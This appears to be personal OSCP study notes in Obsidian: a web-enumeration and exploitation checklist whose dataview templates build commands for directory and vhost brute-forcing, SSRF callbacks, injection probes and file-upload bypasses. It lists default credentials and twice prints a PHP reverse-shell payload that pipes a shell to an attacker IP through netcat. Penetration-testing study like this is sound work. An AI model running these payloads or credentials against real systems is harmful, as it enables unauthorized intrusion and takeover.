
---
Visit the web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
If find any domain names,

Add hosts to /etc/hosts 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

Identify CMS
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `whatweb http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

Use GoBuster to enumerate vhosts and directories

Directories
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `feroxbuster -u http://${discoveredDomain}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 --filter-status 404`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `curl -i ${discoveredDomain}/[newfounddirectory]`;

dv.paragraph("```bash\n" + command + "\n```");
```
Error note : -b 301

Might find application powering the webserver

---

FEROXBUSTER Sweep through file directories
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `feroxbuster -u http://${discoveredDomain}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -t 80 -d 2`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

VHosts
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `gobuster vhost -u http://${discoveredDomain}/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`

dv.paragraph("```bash\n" + command + "\n```");
```

Add newfound vhost to /etc/hosts
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

if API endpoint found, FUZZ with FFUF
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `ffuf -w /usr/share/SecLists/Discovery/Web-Content/api/api-endpoints.txt -u http://${discoveredDomain}/FUZZ -ac`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

If admin login page is found,

Google for default credentials

| Service         | Version          | User  | Username | Password |
| --------------- | ---------------- | ----- | -------- | -------- |
| Dolibarr        | 17.0.0           | Admin | admin    | admin    |
| Jetty           | 9.4.39.v20210325 | Admin | admin    | admin    |
| Request Tracker | 4.4.4            | root  | root     | password |

---

Test parameters (?id=1, ?page=)

---

Observe any suspicious error pages and conduct further research

Examples : 
1. Whitelabel Error Page > Sprint Boot Java Framework

---

If a form accepts URL, try Server Side Request Forgery (SSRF), 

```
nc -lvnp 5553
```

![[Pasted image 20260316194811.png]]

Send a request back to attacker Kali machine and see if capture anything

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `http://${KaliIP}:5553`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260316195540.png]]



---

If .git found, [[GIT dumper]]

Search for credentials

---

Observe any suspicious error pages and conduct further research

Examples : 
1. Whitelabel Error Page > Sprint Boot Java Framework

---

### 1. Command Injection

```
;id
```

```
&& whoami
```
### 2. SQL Injection

```
test'
```

```
1=1;-- -
```
### 3. File Inclusion

```
?page=../../../../etc/passwd
```
### 4. XSS

<script>alert(1)</script>
### 5. File upload abuse

- Upload `.php`
- Try bypass:
    - `.php.jpg`
    - `.phtml`

---

If it works, obtain a reverse shell

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
Once shell is obtained, [[4 Shell Upgrade]]

---

Look for php code inclusion

Templates
Pages

Test for php execution
```
<?PHP echo system("whoami");?>
```

If it works, obtain a reverse shell

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
Once shell is obtained, [[4 Shell Upgrade]]

---